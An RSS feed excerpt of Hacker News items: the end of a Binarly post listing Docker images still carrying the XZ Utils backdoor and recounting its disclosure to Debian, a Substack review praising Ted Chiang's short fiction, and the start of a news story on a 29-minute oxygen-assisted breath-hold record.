          <td>554b70c8b9ed0854851a55e915cefa47cdc18fed201b4aba87193d575410b53d</td>
        </tr>
        <tr>
          <td>sid-20240311</td>
          <td>0aff2113f50451631f0f8c22d85c97aad855d73545b6018fcbe9f0a78ae26583</td>
          <td>3a737ad8ab65fe5ad068d6094fbf99ce9ed2b5beff9c86daceee8c2c50182bde</td>
        </tr>
        <tr>
          <td>untagged</td>
          <td>fa2016c58b4df666286dfa14b2402c05d60c556ecfd4c60635b64ad21380edba</td>
          <td>93e647bfd891e82156d7a13e0f0b194003855008967ec51e962ea0d70fc59ff6</td>
        </tr>
        <tr>
          <td>untagged</td>
          <td>e24f4205978e6c0f98697e2075439825f86df56457d2d1ea9e0f8593cf5b5236</td>
          <td>522a6d12a8a3032c984d93fd141274f1cb7cc1e9a6942e3b36cbf803bbe36a12</td>
        </tr>
      </tbody>
    </table>
  
</div><p><em>Table 1. Docker images for Debian that contain the XZ Utils backdoor. All affected images are built for the amd64 architecture.</em></p><p>‍</p><p>After this initial discovery, we began to wonder: what about other images that might have been built on top of these compromised Debian images? Unfortunately, the Docker API doesn’t provide a reverse index that maps an image to all the base images using it. Because of this, we decided to build a script that fetches all images present in a Docker Hub repository and checks whether any are based on the compromised Debian images.&nbsp;</p><p>Since Docker Hub contains nearly 12 million repositories (each possibly containing hundreds or even thousands of images) it would be infeasible to scan the entirety of it. Therefore, we manually created a list of repositories likely using Debian-based images. This list is far from perfect, as it only includes repositories we found manually or those returned from Google searches using the base image blob hash.&nbsp;</p><div>
  
    <table>
      <thead>
        <tr>
          <th>Repository</th>
          <th>Tag</th>
          <th>Latest Tag?</th>
          <th>Manifest Digest</th>
        </tr>
      </thead>
      <tbody>
        <tr>
          <td>buildpack-deps</td>
          <td>untagged</td>
          <td>-</td>
          <td>5e4438a4660fff39ff4671bc5ecfaea3e639dafe61d5c19c735335c96d61c1e4</td>
        </tr>
        <tr>
          <td>buildpack-deps</td>
          <td>untagged</td>
          <td>-</td>
          <td>443be2e684c2974f94329fe904ab025826cd45f4a1dc52a922e5b01e66e75ee0</td>
        </tr>
        <tr>
          <td>buildpack-deps</td>
          <td>untagged</td>
          <td>-</td>
          <td>8f95f8a59ac3227cb7483799a6836e9c79d5cef491ba672c1958abdf36bf7648</td>
        </tr>
        <tr>
          <td>buildpack-deps</td>
          <td>untagged</td>
          <td>-</td>
          <td>bf7c5e7df1344c29825cecf0b13a48e3542d9076344bb488f886f9dfce534e05</td>
        </tr>
        <tr>
          <td>buildpack-deps</td>
          <td>untagged</td>
          <td>-</td>
          <td>8d5e5912bc9fdc287f89b87e7b97a615110842f6c6f3ed380dccef85a75ef6cc</td>
        </tr>
        <tr>
          <td>buildpack-deps</td>
          <td>untagged</td>
          <td>-</td>
          <td>d650be418934c90f6e9e3efcb52bef7ad660324074002efb8541e7baf9aab6d8</td>
        </tr>
        <tr>
          <td>neurodebian</td>
          <td>untagged</td>
          <td>-</td>
          <td>388d46f65da097cd9371385d9c2f3f3fe04d4bc88b529b52125b9f94d74edaff</td>
        </tr>
        <tr>
          <td>neurodebian</td>
          <td>untagged</td>
          <td>-</td>
          <td>7ffa336b9a0f2e594d1df70ce66a259db156902baa371337a6bfaae2eefa4de3</td>
        </tr>
        <tr>
          <td>r-base</td>
          <td>untagged</td>
          <td>-</td>
          <td>3b5c502ccd9d4a6c0937a6bfc51e02741bdc7c520fe458ce4d9c136553df42b0</td>
        </tr>
        <tr>
          <td>georchestra/jenkins-builder</td>
          <td>sid-jdk-8</td>
          <td>YES</td>
          <td>d7ad7c3386a874e81006bc6fab0ce7eb5cf227f4a1c2d3dff7850e17ff7a5f48</td>
        </tr>
        <tr>
          <td>myoung34/github-runner</td>
          <td>2.315.0-debian-sid</td>
          <td>NO</td>
          <td>8c0c44b7404fdcdc52f4c04d41b2a674510ac98f21fb81cd68575be30eeb51a7</td>
        </tr>
        <tr>
          <td>slash5toaster/calibre</td>
          <td>7.7.0</td>
          <td>NO</td>
          <td>fa5dcddaa909b76a8b6c5fb44a8eb833ab2f407f81cc7185a9c299e02cc1c2ef</td>
        </tr>
        <tr>
          <td>flowgunso/seafile-client</td>
          <td>9.0.4</td>
          <td>NO</td>
          <td>b6d1c3b9232874356dee489685528f94c048e6683573cdb5b0a0b106e3d85708</td>
        </tr>
        <tr>
          <td>makepad/opencv</td>
          <td>trixie-4.8.1</td>
          <td>NO</td>
          <td>153319e41415b5a789704e31017aff2e2c8223c2e155875947639935fa4f72ca</td>
        </tr>
        <tr>
          <td>makepad/opencv</td>
          <td>trixie-4.8.0</td>
          <td>NO</td>
          <td>1b5b2b14dc1262074e0b933ae8a483a5f21c5fc2e9dd42f0b7e8f2fa2ebc12a0</td>
        </tr>
        <tr>
          <td>makepad/opencv</td>
          <td>trixie-4.7.0</td>
          <td>NO</td>
          <td>060fddaf2879513e900d0e93097c3096f541ca871c390639bb6cb67c6fd1bc84</td>
        </tr>
        <tr>
          <td>makepad/opencv</td>
          <td>trixie-4.9.0</td>
          <td>YES</td>
          <td>2fdc5fa0c19fe4e04d3117477f49b8b7e0e4124290d9f4270f215f8e7c5b9078</td>
        </tr>
        <tr>
          <td>makepad/opencv</td>
          <td>trixie-slim-4.8.0</td>
          <td>NO</td>
          <td>f5e90754a89e6837c7b5165b57ffd4d5d66990d798bfce1018048b7ac21f0e6a</td>
        </tr>
        <tr>
          <td>makepad/opencv</td>
          <td>trixie-slim-4.9.0</td>
          <td>YES</td>
          <td>7a4e5b592b318a38542dd21f87a810263d39a3b4caf9d85bb973594264a38fca</td>
        </tr>
        <tr>
          <td>makepad/opencv</td>
          <td>trixie-slim-4.8.1</td>
          <td>NO</td>
          <td>cdb95cc294d7ea4f1703e817674c477e99a80be16a6c980f88365f77c195f0f0</td>
        </tr>
        <tr>
          <td>makepad/opencv</td>
          <td>trixie-slim-4.7.0</td>
          <td>NO</td>
          <td>94a10719a142f3b11c6d8cd4bc88b415a163f7052061c22222df7c4c96a95aa2</td>
        </tr>
        <tr>
          <td>optionfactory/debian13</td>
          <td>80</td>
          <td>NO</td>
          <td>1dedf1ad124f7eff12011122565bed92c207d3cd1c9b650a40fb680d846bd515</td>
        </tr>
        <tr>
          <td>optionfactory/debian13</td>
          <td>81</td>
          <td>NO</td>
          <td>1dedf1ad124f7eff12011122565bed92c207d3cd1c9b650a40fb680d846bd515</td>
        </tr>
        <tr>
          <td>controlplane/sectools</td>
          <td>latest</td>
          <td>YES</td>
          <td>86090b316ad096e53c81f91e94ac2ae95c2f28feee10ce8ec32aa573d8263021</td>
        </tr>
      </tbody>
    </table>
  
</div><p><em>Table 2. Second-order docker images (based on the compromised Docker images) containing the XZ Utils backdoor. The “Latest Tag?” column reports whether the affected tag is the latest available one.</em></p><p>‍</p><p>The previous table lists the <strong>second-order images</strong> containing the XZ Utils backdoor. While some appear to be personal projects, other images may be used in enterprise environments. In a recursive fashion, these images could themselves serve as base images, leading to the creation of impacted <strong>third-order images </strong>and so on and so forth. Doing such a recursive exploration is the only way to gain meaningful insights into the extent of the backdoor’s propagation within the Docker ecosystem.</p><h2>Disclosing our findings&nbsp;</h2><p>Upon discovering this issue, Binarly immediately <a href="https://github.com/debuerreotype/docker-debian-artifacts/issues/246">notified</a> the Debian maintainers and requested removal, but the affected images remain in place.</p><p>‍</p><figure><p><img src="https://cdn.prod.website-files.com/65dc9e6c7079139a2996b5d7/689ae537f117e310436353ab_AD_4nXc8f8eEhkAHhHT6sQV6c-atsM_xB7jw9a3E021uOPoyuRAwxJiIRqb0yE7xi7CBEAPuT0SoASelqC2rBWIATTrhI1m1hy-7EiClBahZ2_7IVrHoNf80HJBy2Hm2LXJJi2dmHz8_PQ.png" loading="lazy" alt=""></p><figcaption>Figure 1. Response from the Debian maintainer to our disclosure</figcaption></figure><p>We only partially agree with this response: while it is true that users should rely on up-to-date images, leaving publicly available Docker images that contain a potential network-reachable backdoor poses a significant security risk. Even if the practical impact of this issue is somewhat limited, given that exploitation requires the backdoor key owners to have network access to the infected device or container with the SSH service running.&nbsp;</p><p>Nonetheless, our discovery underscores how even short-lived backdoored builds can remain unnoticed and persist in container registries for a very long time.</p><h2>Responding to “XZ Utils”-like incidents with the Binarly Transparency Platform</h2><p>Security incidents affecting the software supply chain are more frequent than ever. This is one of the key motivations for building the Binarly Transparency Platform: we want to empower security researchers, product security teams and organizations with the right tools they need to detect and remediate threats effectively.&nbsp;&nbsp;&nbsp;&nbsp;</p><p>From day one BTP customers had access to a precise analysis developed by our research team to detect IFUNC-based hooking, which is the same technique used in the XZ backdoor. This is the same technology that powers <a href="http://xz.fail/">xz.fail</a>, a free scanning tool that Binarly released to support the broader community and help affected organizations to respond to this threat.</p><p>One of the latest additions to our platform, unveiled last week at Black Hat USA, is the integration of YARA rules. Part of this integration is a new <strong>Rule Playground</strong> designed to help platform users to develop YARA rules. In just a few minutes, organizations can scan their entire software portfolio using YARA rules, whether developed internally or sourced from the broader security community.</p><h2>Conclusion</h2><p>The xz-utils backdoor incident demonstrates that even short-lived malicious code can remain unnoticed in official container images for a long time, and that can propagate in the Docker ecosystem. The delay underscores how these artifacts may silently persist and propagate through CI pipelines and container ecosystems, reinforcing the critical need for continuous binary-level monitoring beyond simple version tracking.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Ted Chiang: The Secret Third Thing (260 pts)]]></title>
            <link>https://linch.substack.com/p/ted-chiang-review</link>
            <guid>44946774</guid>
            <pubDate>Tue, 19 Aug 2025 00:05:59 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://linch.substack.com/p/ted-chiang-review">https://linch.substack.com/p/ted-chiang-review</a>, See on <a href="https://news.ycombinator.com/item?id=44946774">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><article><div dir="auto"><p>I really like Ted Chiang’s writing.</p><p>I think he's probably the best science fiction short story writer alive, and possibly the best short story writer, period.</p><p><span>I've read every one of his stories at least twice, and The Merchant and the Alchemist's Gate more like seven times. I’ve noticed many of his readers, including some of his most positive reviewers</span><span><a data-component-name="FootnoteAnchorToDOM" id="footnote-anchor-1-171116224" href="https://linch.substack.com/p/ted-chiang-review#footnote-1-171116224" target="_self" rel="">1</a></span><span>, miss one key point or another of his works, and thus don't fully appreciate his genius.</span></p><p>This review covers what he does extremely well, especially unique elements that other science fiction writers have not done as well, or at all.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/$s_!H6ea!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3ae13be8-25e5-4a7d-9f54-4c246cac09ab_1600x1600.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/$s_!H6ea!,w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3ae13be8-25e5-4a7d-9f54-4c246cac09ab_1600x1600.png 424w, https://substackcdn.com/image/fetch/$s_!H6ea!,w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3ae13be8-25e5-4a7d-9f54-4c246cac09ab_1600x1600.png 848w, https://substackcdn.com/image/fetch/$s_!H6ea!,w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3ae13be8-25e5-4a7d-9f54-4c246cac09ab_1600x1600.png 1272w, https://substackcdn.com/image/fetch/$s_!H6ea!,w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3ae13be8-25e5-4a7d-9f54-4c246cac09ab_1600x1600.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/$s_!H6ea!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3ae13be8-25e5-4a7d-9f54-4c246cac09ab_1600x1600.png" width="477" height="477" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/3ae13be8-25e5-4a7d-9f54-4c246cac09ab_1600x1600.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:1456,&quot;width&quot;:1456,&quot;resizeWidth&quot;:477,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null,&quot;belowTheFold&quot;:false,&quot;topImage&quot;:true,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false,&quot;align&quot;:null,&quot;offset&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/$s_!H6ea!,w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3ae13be8-25e5-4a7d-9f54-4c246cac09ab_1600x1600.png 424w, https://substackcdn.com/image/fetch/$s_!H6ea!,w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3ae13be8-25e5-4a7d-9f54-4c246cac09ab_1600x1600.png 848w, https://substackcdn.com/image/fetch/$s_!H6ea!,w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3ae13be8-25e5-4a7d-9f54-4c246cac09ab_1600x1600.png 1272w, https://substackcdn.com/image/fetch/$s_!H6ea!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3ae13be8-25e5-4a7d-9f54-4c246cac09ab_1600x1600.png 1456w" sizes="100vw" fetchpriority="high"></picture></div></a></figure></div><p>Science fiction critics often divide the genre into:</p><ul><li><p><span>"hard" science fiction: aka </span><em>engineering</em><span> fiction, stories built on scientifically accurate extrapolations of real physics and technology (think Arthur C. Clarke)</span></p></li><li><p><span>"soft" science fiction: aka science </span><em>fantasy</em><span>, which uses scientific trappings as window dressing for character-driven or sociological stories (think Star Wars).</span></p></li></ul><p><span>Ted Chiang has written stories plausibly categorized as either, but more excitingly, many of his stories are </span><em>neither</em><span>. He often writes what I think of as true </span><em>science</em><span> fiction, where the </span><em>principles of science themselves</em><span> are meaningfully different from our world, but still internally consistent.</span></p><p><span>In </span><em>Omphalos</em><span>, Young Earth Creationism is empirically true</span><span><a data-component-name="FootnoteAnchorToDOM" id="footnote-anchor-2-171116224" href="https://linch.substack.com/p/ted-chiang-review#footnote-2-171116224" target="_self" rel="">2</a></span><span>. Astronomers can only see light from stars 6,000 light-years away. Fossilized trees have centers with no rings. The first God-created humans lack belly buttons. The scientists in that story keep discovering multiple independent lines of evidence that converge on creationism: because in that universe, they're simply correct.</span></p><p><span>In </span><em>Seventy-Two Letters</em><span>, technology springs from Jewish Kabbalah. Golems and divine names drive industrial progress in a steampunk world</span><span><a data-component-name="FootnoteAnchorToDOM" id="footnote-anchor-3-171116224" href="https://linch.substack.com/p/ted-chiang-review#footnote-3-171116224" target="_self" rel="">3</a></span><span>.</span></p><p><span>Excitingly, he does this not just with natural sciences but social sciences as well. In </span><em>Story of Your Life</em><span>, strong </span><a href="http://sapir-whorf/" rel="">Sapir-Whorf</a><span> (the idea that language significantly constrains thought) isn't a largely discredited linguistic hypothesis, but the key to navigating First Contact with alien minds that experience past and future as equally present.</span></p><p>This comes up in his other stories as well:</p><ul><li><p><span>In </span><em>Exhalation,</em><span> thermodynamics appear to work differently</span></p></li><li><p><span>In </span><em>Division By Zero</em><span>, mathematics itself is broken from within.</span></p></li><li><p><span>In </span><em>Hell Is the Absence of God</em><span>, divine intervention is empirically observable and follows consistent rules</span></p></li></ul><p><span>Many of his readers, even in their otherwise rave reviews, miss this. Multiple reviewers complain about how the science in his stories are “unrealistic” (e.g. strong Sapir-Whorf is “discredited”). They expected </span><em>hard</em><span> science fiction; Chiang was doing something different. Chiang created different universes with internally self-consistent scientific laws, using science fiction and alternative science as a vehicle for exploring philosophical progress and human relationships.</span></p><p><span>Science fiction writers used to </span><em>like</em><span> technology. For some reason, this has become increasingly uncommon, even passé. Doubly so for Western writers, and quadruply so for Western, literary, “humanist” writers.</span></p><p><span>Now it’s hip and trendy to think of every new technology as the </span><a href="https://x.com/AlexBlechman/status/1457842724128833538?lang=en" rel="">Torment Nexus</a><span>. Most science fiction today feels like </span><a href="https://en.wikipedia.org/wiki/Black_Mirror" rel="">Black Mirror,</a><span> which ran 7 seasons with exactly one happy ending.</span></p><p><span>Chiang bucks this trend. </span><a href="https://www.newyorker.com/magazine/2019/05/13/science-fiction-doesnt-have-to-be-dystopian" rel="">Joyce Carol Oates</a><span>:</span></p><blockquote><p>It is both a surprise and a relief to encounter fiction that [...] ask[s] anew philosophical questions that have been posed repeatedly through millennia to no avail. Chiang’s materialist universe is a secular place, in which God, if there is one, belongs to the phenomenal realm of scientific investigation and usually has no particular interest in humankind. But it is also a place in which the natural inquisitiveness of our species leads us to ever more astonishing truths, and an alliance with technological advances is likely to enhance us, not diminish us. Human curiosity, for Chiang, is a nearly divine engine of progress.</p></blockquote><p><span>In the hands of a lesser (or perhaps just more pessimistic) writer, many of the technologies and ideas Chiang explores will have an accursed quality to them, a monkey’s paw that curls into delivering a future much worse than a more innocent, pastoral past. Chiang resists those cliches. In </span><em>The Truth of Fact, The Truth of Feeling</em><span>, memory augmentation technology allows the narrator to understand his own self-deceptions, and work towards becoming a better person and reconciling with loved ones and even himself. In </span><em>Liking What You See: A Documentary</em><span>, a technology that gives users acquired face-blindness allows the main characters to meditate on the nature of human beauty and the shallowness inherent in privileging the beautiful.</span></p><p>Even in situations where the story is overall tragic, like when the characters are faced with existential crisis (in the individual sense), or existential catastrophe (in the world-ending sense), technology isn't the villain but the vehicle for understanding unbearable truths (whether about the world or about ourselves).</p><p><span>Chiang consistently shows us the potential of technology to help us become </span><em>more</em><span> human, and have a deeper appreciation for the world and our place in it.</span></p><p><em>“Compatibilism is a philosophical stance that reconciles free will with determinism. It argues that free will, understood as the ability to act according to one's desires, is compatible with the idea that all events, including human actions, are causally determined by prior events. Essentially, compatibilists believe that even if our choices are predetermined, we can still be considered free and morally responsible if those choices are a result of our own internal states, like desires and intentions.”</em></p><p><span>Does that make sense to you? I’m not sure it does to me. In practice, compatibilism says something like “</span><em>free will in the normal, pretheoretic sense of the term, doesn’t exist. Your choices still meaningfully matter nonetheless. You can’t meaningfully get out of the bind philosophically. What you can do, however, is make peace with it.”</em></p><p>Chiang makes this realization visceral. From The Merchant and the Alchemist's Gate:</p><blockquote><p>“My journey to the past had changed nothing, but what I had learned had changed everything...Nothing erases the past. There is repentance, there is atonement, and there is forgiveness. That is all, but that is enough.”</p></blockquote><p><span>“That is all, but that is enough” on the surface sounds like a </span><a href="https://philosophytalk.org/blog/deepities-and-bullshit/" rel="">deepity</a><span>, but I genuinely find it more moving than anything else I’ve read on free will, determinism, or compatibilism.</span></p><p>When Chiang uses time travel as a motif, the stories differ from typical time travel stories. Because causation is a closed loop, knowing the future does not give you special access to it, and Chiang’s characters tend to not fight the future (successfully or otherwise).</p><p><span>In Story of Your Life [SPOILERS], the narrator learns an atemporal alien language and begins experiencing past and future as equally real.</span><span><a data-component-name="FootnoteAnchorToDOM" id="footnote-anchor-4-171116224" href="https://linch.substack.com/p/ted-chiang-review#footnote-4-171116224" target="_self" rel="">4</a></span><span> It takes her some time to make peace with it, but eventually she fully accepts the truth of determinism. She understands that life is full of tragedy, including that her daughter will die young, but life is full of beauty too. With both regret and awe, she sets forth on the path that she was destined to take</span><span><a data-component-name="FootnoteAnchorToDOM" id="footnote-anchor-5-171116224" href="https://linch.substack.com/p/ted-chiang-review#footnote-5-171116224" target="_self" rel="">5</a></span><span>.</span></p><p>This is compatibilism from the inside. In both stories, the characters discover they cannot change what will happen, but this knowledge transforms how they experience what must happen: with forgiveness, acceptance, and even joy.</p><p><span>As a friend of mine puts it, “he treats philosophical ideas as lived experiences.”The mathematician in </span><em>Division by Zero</em><span> doesn't just intellectually understand that mathematics is broken; she experiences it as a personal catastrophe, on par with (and concurrent with) her marriage's collapse. In </span><em>Lifecycle of Software Objects</em><span>, the “we are the parents of our mind-children” metaphor for building sentient AI systems becomes quite literal.</span></p><p>I've reread all his stories not just because I love his writing, but because they often mean something different the second time through. Like those optical illusions where seeing the duck in the rabbit changes the image forever, his endings don't surprise so much as illuminate.</p><p>In a sense, this narrative technique is compatibilism as literary form: the ending was always determined, but discovering it still matters. Knowing where you're headed changes how you experience the journey, not whether you take it.</p><p>Notably, he achieves this without cheap tricks or twist endings (however foreshadowed), but something deeper. The endings feel inevitable rather than clever. This technique is so difficult that it's surprising he's managed it repeatedly, using different approaches each time.</p><p>Chiang combines these unique factors that he does exceptionally well with strengths that he shares with other top literary science fiction writers: simple yet beautiful prose, diverse settings, a rigorous understanding of science, philosophy, and human psychology, and appealing, interesting, and diverse characters.</p><p>He is probably the best science fiction short story writer alive, and possibly the best short story writer in general.</p><p><span>Is Chiang perfect? Of course not. I won't belabor obvious points like his nonfictional views on current-generation LLMs being surprisingly shallow</span><span><a data-component-name="FootnoteAnchorToDOM" id="footnote-anchor-6-171116224" href="https://linch.substack.com/p/ted-chiang-review#footnote-6-171116224" target="_self" rel="">6</a></span><span>, or his lack of output being tragic for a generational talent</span><span><a data-component-name="FootnoteAnchorToDOM" id="footnote-anchor-7-171116224" href="https://linch.substack.com/p/ted-chiang-review#footnote-7-171116224" target="_self" rel="">7</a></span><span>.</span></p><p>Instead, I'll focus on two points: weaknesses in portraying how entire societies interface with technology, and his lack of home runs outside of compatibilism.</p><p>I’m an intellectual dilettante. I’m widely read in many fields, and an expert in none. But to the extent I have any real expertise, it’s probably the intersection of the social sciences and technology. And Chiang is surprisingly weak here.</p><p>Chiang’s scientific imagination is strongest at the very macro level (What would the objective physical evidence look like if God created Earth 6,000 years ago?) and the very micro level: This is one person, a named character. How would she and her husband interface with technology? How would technology radically change her life and her self-perception? Chiang’s much weaker at the middle level, where we consider how societies and civilizations collectively face novel technologies.</p><p><span>In </span><em>Anxiety is the Dizziness of Freedom</em><span>, people invented a new Prism(™) that allows them to talk to copies in nearby universes. Chiang treats this technology as an interesting tool to explore his favorite questions of free will, determinism, and what does it mean to be a person, etc.</span></p><p>I think he doesn’t understand the power of this singularity-level technology he just introduced.</p><p>The ability to send bits across parallel universes is just insane in terms of economic and experimentation value. For example, pharmaceutical companies can do $100 billion trials for all sorts of novel drugs, and trade the results of this information with their clones in other universes. Massive R&amp;D projects in general can be done in parallel across different universes, as long as the results can be compressed in enough bits to be sent over these prisms.</p><p>More than that, you can now have not just individual or small-group level studies but societal-wide or even multiverse-wide ones! Wondering whether raising interest rates can cause recessions? Just conduct RCTs across multiverses (and if they can’t coordinate on RCTs, even the observational data would be insanely useful)!</p><p>While the main characters work through existential crises and their mundane, human worries, the rest of society should be accelerating at breakneck speed toward doom, utopia, or something else equally fascinating. Chiang doesn't explore this, even as backdrop.</p><p>While his fictional portrayals of compatibilism are probably the world's best, and he's covered different angles repeatedly, his other philosophical explorations don't achieve the same resonance. Having something both philosophically deep and emotionally resonant is genuinely hard. So I don’t want to be overly critical. But perhaps the lack of attempts on new ideas is not unrelated to his extreme perfectionism and sparse output?</p><p><span>I cannot recommend Chiang more highly. If you could only read one science fiction book this year, I recommend reading </span><em>Stories of Your Life</em><span>. If you could only read 2 science fiction books this year, I recommend reading both </span><em>Stories of Your Life</em><span> and </span><em>Exhalation</em><span>.</span></p><figure data-drag-handle="true" data-component-name="ImageGallery"><div><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/$s_!l_KA!,w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4a03822c-fe6c-4013-876c-46f0b77ca3b5_778x1200.jpeg 424w, https://substackcdn.com/image/fetch/$s_!l_KA!,w_720,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4a03822c-fe6c-4013-876c-46f0b77ca3b5_778x1200.jpeg 720w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/$s_!l_KA!,w_720,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4a03822c-fe6c-4013-876c-46f0b77ca3b5_778x1200.jpeg" sizes="100vw" alt="" srcset="https://substackcdn.com/image/fetch/$s_!l_KA!,w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4a03822c-fe6c-4013-876c-46f0b77ca3b5_778x1200.jpeg 424w, https://substackcdn.com/image/fetch/$s_!l_KA!,w_720,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4a03822c-fe6c-4013-876c-46f0b77ca3b5_778x1200.jpeg 720w" width="720"></picture><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/$s_!g7N-!,w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F35666649-5888-4d16-8a61-65d72db60197_973x1500.jpeg 424w, https://substackcdn.com/image/fetch/$s_!g7N-!,w_720,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F35666649-5888-4d16-8a61-65d72db60197_973x1500.jpeg 720w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/$s_!g7N-!,w_720,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F35666649-5888-4d16-8a61-65d72db60197_973x1500.jpeg" sizes="100vw" alt="" srcset="https://substackcdn.com/image/fetch/$s_!g7N-!,w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F35666649-5888-4d16-8a61-65d72db60197_973x1500.jpeg 424w, https://substackcdn.com/image/fetch/$s_!g7N-!,w_720,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F35666649-5888-4d16-8a61-65d72db60197_973x1500.jpeg 720w" width="720"></picture></div><figcaption>https://www.amazon.com/Stories-Your-Life-Others-Chiang/dp/1101972122  https://www.amazon.com/Exhalation-Ted-Chiang/dp/1101972084/ </figcaption></div></figure><p><a href="https://www.amazon.com/Stories-Your-Life-Others-Chiang/dp/1101972122" rel="">Story Of Your Life</a><span>//</span><a href="https://www.amazon.com/Exhalation-Ted-Chiang/dp/1101972084/" rel="">Exhalation</a></p><p><span>And if you are planning to read 5 science fiction books this year, congrats on making the time for it! In that case I recommend you read </span><em>Story of Your Life</em><span> twice and </span><em>Exhalation</em><span> three times.</span></p><p data-attrs="{&quot;url&quot;:&quot;https://linch.substack.com/p/ted-chiang-review?utm_source=substack&amp;utm_medium=email&amp;utm_content=share&amp;action=share&quot;,&quot;text&quot;:&quot;Share&quot;,&quot;action&quot;:null,&quot;class&quot;:null}" data-component-name="ButtonCreateButton"><a href="https://linch.substack.com/p/ted-chiang-review?utm_source=substack&amp;utm_medium=email&amp;utm_content=share&amp;action=share" rel=""><span>Share</span></a></p><ol><li><p><strong>Berkeley/SF Bay Area readers:</strong><span> We're hosting an in-person screening of </span><em>Arrival</em><span> (based on "Story of Your Life") on August 25th! Still have spots. Please comment or DM for an invite.</span></p></li><li><p><strong>Coming soon:</strong><span> I'm planning to add paid subscriptions for unfinished drafts, research notes, and so people can show general support. Nothing important will be paywalled. Thoughts welcome!</span></p></li><li><p><strong>Thank you:</strong><span> We've hit 200+ subscribers in 1.5 months! I'd love your feedback on topics you'd like to see or how I can improve.</span></p></li></ol></div></article></div><div id="discussion"><h4>Discussion about this post</h4></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Croatian freediver held breath for 29 minutes (271 pts)]]></title>
            <link>https://divernet.com/scuba-news/freediving/how-croatian-freediver-held-breath-for-29-minutes/</link>
            <guid>44946762</guid>
            <pubDate>Tue, 19 Aug 2025 00:04:11 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://divernet.com/scuba-news/freediving/how-croatian-freediver-held-breath-for-29-minutes/">https://divernet.com/scuba-news/freediving/how-croatian-freediver-held-breath-for-29-minutes/</a>, See on <a href="https://news.ycombinator.com/item?id=44946762">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-id="15d3585" data-element_type="widget" data-widget_type="theme-post-content.default">
					
<p>The world record for longest underwater breath-hold using oxygen is often viewed as much as a conjuring trick as an athletic feat – and at one time the title was indeed held by US magician David Blaine. But now a remarkable new mark has been set by a Croatian already recognised for his more conventional competitive freediving achievements.</p>





<p>Vitomir Maričić has set a new Guinness World Record (GWR) of 29min 3sec for “the longest breath held voluntarily under water using oxygen” – surpassing the previous record by more than four minutes.</p>



<p>Also read: <strong><a href="https://divernet.com/scuba-news/freediving/champagne-master-dies-freediving/">Champagne master dies freediving</a></strong></p>



